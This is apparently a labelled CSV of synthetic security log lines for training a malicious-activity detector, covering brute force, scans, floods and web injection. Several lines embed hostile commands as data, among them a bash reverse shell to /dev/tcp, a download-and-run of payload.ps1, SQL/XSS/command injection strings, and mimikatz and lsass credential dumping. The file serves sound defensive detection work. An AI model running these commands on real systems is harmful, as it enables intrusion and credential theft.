raw,label
Jan  1 00:00:00 edge-fw01 sshd[1000]: Failed password for root from 10.0.0.1 port 1024 ssh2,1
Feb  2 01:07:13 web01 sshd[1037]: Invalid user admin from 10.0.0.2 port 1197,1
Mar  3 02:14:26 web02 sshd[1074]: Failed password for invalid user oracle from 10.0.0.3 port 1370 ssh2,1
Apr  4 03:21:39 auth01 sshd[1111]: maximum authentication attempts exceeded for root from 10.0.0.4 port 1543 ssh2 [preauth],1
May  5 04:28:52 vpn01 sshd[1148]: PAM 6 more authentication failures; user=root rhost=10.0.0.5,1
Jun  6 05:35:05 db01 kernel[1185]: SYN scan detected from 10.0.0.6 to 192.168.0.15:22 flags=SYN window=1024,1
Jul  7 06:42:18 app01 suricata[1222]: ET SCAN Nmap Scripting Engine User-Agent detected from 10.0.0.7 to 192.168.0.16,1
Aug  8 07:49:31 mail01 firewall[1259]: Port scan detected: nmap -sV 192.168.0.17 from 10.0.0.8 ports 1-1024,1
"Sep  9 08:56:44 proxy01 kernel[1296]: TCP stealth scan from 10.0.0.9 to 172.16.0.28:443 flags=FIN,URG,PSH",1
Oct 10 09:03:57 worker01 snort[1333]: SCAN masscan inbound sweep from 10.0.0.10 to 192.168.0.19 priority 2,1
Jan 11 10:10:10 edge-fw01 kernel[1370]: SYN flood detected from 10.0.0.11 port 2754 to 192.168.0.20:80 packets=12800,1
Feb 12 11:17:23 web01 nginx[1407]: Connection flood from 10.0.0.12 to 192.168.0.21:443 rate=5000/sec action=drop,1
Mar 13 12:24:36 web02 haproxy[1444]: DoS threshold exceeded client=10.0.0.13 backend=api conn_rate=2200/s,1
Apr 14 13:31:49 auth01 firewall[1481]: DDoS UDP flood detected source=10.0.0.14 destination=172.16.0.33 dport=53,1
May 15 14:38:02 vpn01 kernel[1518]: possible TCP SYN flood on port 80 from 10.0.0.15; sending cookies,1
Jun 16 15:45:15 db01 nginx[1555]: GET /admin?user=admin' OR 1=1-- HTTP/1.1 from 10.0.0.16 returned 403,1
Jul 17 16:52:28 app01 nginx[1592]: POST /search?q=<script>alert(1)</script> HTTP/1.1 from 10.0.0.17 returned 403,1
Aug 18 17:59:41 mail01 apache2[1629]: SQL injection attempt select union password from users src=10.0.0.18 uri=/login,1
Sep 19 18:06:54 proxy01 apache2[1666]: XSS attack blocked src=10.0.0.19 uri=/comment?msg=<img src=x onerror=alert(1)>,1
Oct 20 19:13:07 worker01 modsecurity[1703]: Command injection attempt src=10.0.0.20 uri=/cgi-bin/status?cmd=/bin/sh -c id,1
Jan 21 20:20:20 edge-fw01 winlogbeat[1740]: Process creation powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQ== user=jsmith host=192.168.0.30,1
Feb 22 21:27:33 web01 sysmon[1777]: mimikatz.exe sekurlsa::logonpasswords executed by user=administrator src=10.0.0.22,1
Mar 23 22:34:46 web02 edr[1814]: Suspicious credential dump tool procdump.exe -ma lsass.exe from host 192.168.0.32,1
Apr 24 23:41:59 auth01 auditd[1851]: bash spawned reverse shell /bin/bash -i >& /dev/tcp/10.0.0.24/4444 0>&1 uid=1001,1
May 25 00:48:12 vpn01 powershell[1888]: Invoke-WebRequest hxxp://10.0.0.25/payload.ps1 followed by powershell.exe -nop -w hidden,1
Jun 26 01:55:25 db01 dnsmasq[1925]: Outbound DNS query to c2.evil.example.com from 192.168.0.35 classified malware C2,1
Jul 27 02:02:38 app01 proxy[1962]: Outbound connection to evil.example.com:443 from 192.168.0.36 user=svc-backup action=blocked,1
Aug 28 03:09:51 mail01 clamav[1999]: Known malware hash detected: abc123 src=192.168.0.37 file=/tmp/dropper.exe signature=Trojan.Generic,1
Sep  1 04:16:04 proxy01 suricata[2036]: ET MALWARE C2 communication detected from 192.168.0.38 to 10.0.0.29:443 JA3=badc0ffee,1
Oct  2 05:23:17 worker01 firewall[2073]: Beaconing behavior detected host=192.168.0.39 destination=malware-control.example.net interval=60s,1
Jan  3 06:30:30 edge-fw01 sudo[2110]: root : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash,1
Feb  4 07:37:43 web01 auditd[2147]: privilege escalation attempt pkexec /bin/bash by uid=1001 auid=1001 src=192.168.0.41,1
Mar  5 08:44:56 web02 sudo[2184]: authentication failure ; user=dev ; rhost=10.0.0.33 ; COMMAND=/usr/bin/su root,1
Apr  6 09:51:09 auth01 kernel[2221]: DirtyPipe CVE-2022-0847 exploit attempt detected from process ./exploit uid=1001,1
May  7 10:58:22 vpn01 auditd[2258]: chmod u+s /bin/bash executed by user=www-data possible privilege escalation,1
Jun  8 11:05:35 db01 sshd[2295]: Failed password for root from 10.0.0.36 port 7079 ssh2,1
Jul  9 12:12:48 app01 sshd[2332]: Invalid user admin from 10.0.0.37 port 7252,1
Aug 10 13:19:01 mail01 sshd[2369]: Failed password for invalid user oracle from 10.0.0.38 port 7425 ssh2,1
Sep 11 14:26:14 proxy01 sshd[2406]: maximum authentication attempts exceeded for root from 10.0.0.39 port 7598 ssh2 [preauth],1
Oct 12 15:33:27 worker01 sshd[2443]: PAM 6 more authentication failures; user=root rhost=10.0.0.40,1
Jan 13 16:40:40 edge-fw01 kernel[2480]: SYN scan detected from 10.0.0.41 to 192.168.0.50:22 flags=SYN window=1024,1
Feb 14 17:47:53 web01 suricata[2517]: ET SCAN Nmap Scripting Engine User-Agent detected from 10.0.0.42 to 192.168.0.51,1
Mar 15 18:54:06 web02 firewall[2554]: Port scan detected: nmap -sV 192.168.0.52 from 10.0.0.43 ports 1-1024,1
"Apr 16 19:01:19 auth01 kernel[2591]: TCP stealth scan from 10.0.0.44 to 172.16.0.63:443 flags=FIN,URG,PSH",1
May 17 20:08:32 vpn01 snort[2628]: SCAN masscan inbound sweep from 10.0.0.45 to 192.168.0.54 priority 2,1
Jun 18 21:15:45 db01 kernel[2665]: SYN flood detected from 10.0.0.46 port 8809 to 192.168.0.55:80 packets=12800,1
Jul 19 22:22:58 app01 nginx[2702]: Connection flood from 10.0.0.47 to 192.168.0.56:443 rate=5000/sec action=drop,1
Aug 20 23:29:11 mail01 haproxy[2739]: DoS threshold exceeded client=10.0.0.48 backend=api conn_rate=2200/s,1
